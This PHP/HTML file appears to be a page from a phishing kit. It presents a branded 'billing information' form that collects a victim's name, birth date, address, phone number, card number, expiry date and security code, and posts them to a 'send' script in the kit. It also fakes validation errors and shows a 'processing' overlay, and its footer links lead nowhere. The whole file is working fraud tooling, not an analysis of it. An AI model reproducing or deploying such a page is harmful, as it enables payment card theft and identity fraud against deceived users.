<?php
	session_start();
	include("../settings/lang/index.php");

	$url = $_SERVER["REQUEST_URI"];
	if(strpos($url, "inconnubirth") == true) {
		$brtbug = "hasError";
	}
	if(strpos($url, "inconnuccnum") == true) {
		$ccbug = "hasError";
	}
	if(strpos($url, "inconnuexp") == true) {
		$expbug = "hasError";
	}
	if(strpos($url, "inconnucsc") == true) {
		$cscbug = "hasError";
	}
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title><?php echo $xeon13; ?></title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/main.js"></script>
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
	<script src="../assets/js/jquery.CardValidator.js"></script>
	<script src="../assets/js/jquery.payment.js"></script>
</head>
<body>

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>

		<!--[ BILL CONTAINER ]-->
				<div class="xeonContent xeonContentInfo">

				<!-- CONTAINER --> 
					<div class="xeonsafeComponent">
						<header class="xeonInfo">
							<div class="xeonLogo big"></div>
						</header>
						<div class="xeonsafe">
							<h1 class="xeonInfoTitle"><?php echo $xeon14; ?></h1>
								<p class="xeonFormTitle"><?php echo $xeon15; ?></p>

							<form action="../settings/send/xeoninfo.php" method="post" name="bilForm" onsubmit="return validateBillForm()">

								<p class="FieldsTitle"><?php echo $xeon16; ?></p>
								<div class="xeonFieldset">
									<input type="text" class="capital" name="xeonFnm" id="xeonFnm" placeholder="<?php echo $xeon17; ?>" maxlength="40" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["xeonFname"]; ?>" />
								</div>
								<div class="xeonFieldset">
									<input type="tel" class="<?php echo $brtbug; ?>" name="xeonBirth" id="xeonBirth" placeholder="<?php echo $xeon18; ?>" maxlength="10" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["xeonBirth"]; ?>" />
								</div>
								<div class="xeonFieldset">
									<input type="text" name="xeonAdr" id="xeonAdr" placeholder="<?php echo $xeon19; ?>" maxlength="40" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["xeonAdrss"]; ?>" />
								</div>
								<div class="xeonMultiFieldset">
									<input type="text"  name="xeoncty" id="xeoncty" class="capital" placeholder="<?php echo $xeon20; ?>" maxlength="20" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["xeonCitey"]; ?>" />
									<input type="text" name="xeonzip" id="xeonzip" placeholder="<?php echo $xeon21; ?>" maxlength="10" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["xeonZipcd"]; ?>" />
								</div>
								<div class="xeonFieldset">
									<?php echo $country; ?>
								</div>
								<div class="xeonFieldset">
									<input type="tel" name="xeontel" id="xeontel" placeholder="<?php echo $xeon22; ?>" maxlength="15" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["xeonNmtel"]; ?>" />
								</div>

								<p class="FieldsTitle">Card informations :</p>
								<div class="xeonFieldset" style="position: relative;padding: ">
									<input type="tel" name="xeoncc" id="xeoncc" placeholder="<?php echo $xeon23; ?>" class="xeoncc <?php echo $ccbug; ?>" maxlength="19" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["xeonCcnum"]; ?>"/>
									<span class="cc-icon" id="cicon"></span>
								</div>
								<div class="xeonMultiFieldset">
									<input type="tel" class="<?php echo $expbug; ?>" name="xeonExp" id="xeonExp" placeholder="<?php echo $xeon24; ?>" maxlength="5" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["xeonCcexp"]; ?>"/>
									<input type="tel" name="xeoncsc" id="xeoncsc" placeholder="<?php echo $xeon25; ?>" class="xeoncsc <?php echo $cscbug; ?>" id="xeoncsc" maxlength="3" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["xeonCccsc"]; ?>" />
								</div>
								<div class="xeonWhatIsCCContainer">
									<a href="javascript:void(0)" class="xeonWhatIsCC" id="xeonWhatIsCC" onclick="xeonWhatIsCC3()"><?php echo $xeon26; ?></a>
									<p class="xeonWhatIsCCText hide" id="xeonWhatIsCCText3">
										<img src="../assets/img/3.png" alt="">
										<span><?php echo $xeon27; ?></span>
									</p>
									<p class="xeonWhatIsCCText hide" id="xeonWhatIsCCText4">
										<img src="../assets/img/4.png" alt="">
										<span><?php echo $xeon28; ?></span>
									</p>
								</div>

								<input type="submit" class="xeonButton" name="xeoninfotp" value="<?php echo $xeon29; ?>">
							</form>
						</div>
					</div>

				</div>
			</div>
		</div>
	</div>

	<footer class="xeonFooter">
		<ul class="xeonFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

	<script type="text/javascript" src="../assets/js/sections.js"></script>

	<script>
		$(document).ready(function(){
		$('#xeonFnm').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonFnm').removeClass('hasError'); } else {$('#xeonFnm').removeClass('hasError'); }});

		$('#xeonBirth').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonBirth').removeClass('hasError'); } else {$('#xeonBirth').removeClass('hasError'); }});

		$('#xeonAdr').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonAdr').removeClass('hasError'); } else {$('#xeonAdr').removeClass('hasError'); }});

		$('#xeoncty').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeoncty').removeClass('hasError'); } else {$('#xeoncty').removeClass('hasError'); }});

		$('#xeonzip').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonzip').removeClass('hasError'); } else {$('#xeonzip').removeClass('hasError'); }});

		$('#xeonCtry').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonCtry').removeClass('hasError'); } else {$('#xeonCtry').removeClass('hasError'); }});

		$('#xeontel').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeontel').removeClass('hasError'); } else {$('#xeontel').removeClass('hasError'); }});

		$('#xeoncc').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeoncc').removeClass('hasError'); } else {$('#xeoncc').removeClass('hasError'); }});

		$('#xeonExp').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonExp').removeClass('hasError'); } else {$('#xeonExp').removeClass('hasError'); }});

		$('#xeoncsc').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeoncsc').removeClass('hasError'); } else {$('#xeoncsc').removeClass('hasError'); }});
		
		});
	</script>
	
<!-- LOADING -->
	<div class="xeonLoaderOverlay">
		<div class="xeonModalAnimate" id="xeonModalAnimate">
			<div class="xeonRotate"></div>
			<div class="xeonProcessing"><?php echo $xeon12; ?></div>
			<div class="xeonLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="xeonModalOverlay" id="xeonModalOverlay"></div>

</body>
</html>